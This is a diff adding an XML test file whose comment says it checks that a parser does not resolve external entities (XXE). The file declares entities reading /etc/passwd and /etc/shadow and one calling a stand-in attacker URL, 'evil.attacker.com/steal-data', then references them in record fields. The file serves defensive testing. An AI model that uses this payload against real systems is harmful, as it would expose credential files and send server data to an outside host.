@@ -1,0 +1,40 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+  XXE Attack Test File
+  ====================
+  This file attempts to exploit XML External Entity (XXE) vulnerabilities.
+
+  EXPECTED BEHAVIOR (with fix):
+  - External entities should NOT be resolved
+  - No server files should be exposed
+  - Parser should handle the file safely or reject it
+
+  VULNERABLE BEHAVIOR (without fix):
+  - Contents of /etc/passwd would be inserted into the 'secret' field
+  - Attacker could read arbitrary server files
+-->
+<!DOCTYPE records [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY xxe2 SYSTEM "file:///etc/shadow">
+  <!ENTITY remote SYSTEM "http://evil.attacker.com/steal-data?data=">
+]>
+<records>
+    <record>
+        <id>1</id>
+        <name>Normal User</name>
+        <email>user@example.com</email>
+        <secret>&xxe;</secret>
+    </record>
+    <record>
+        <id>2</id>
+        <name>Another Test</name>
+        <email>test@example.com</email>
+        <secret>Normal value here</secret>
+    </record>
+    <record>
+        <id>3</id>
+        <name>Remote XXE Test</name>
+        <email>remote@test.com</email>
+        <description>&remote;</description>
+    </record>
+</records>
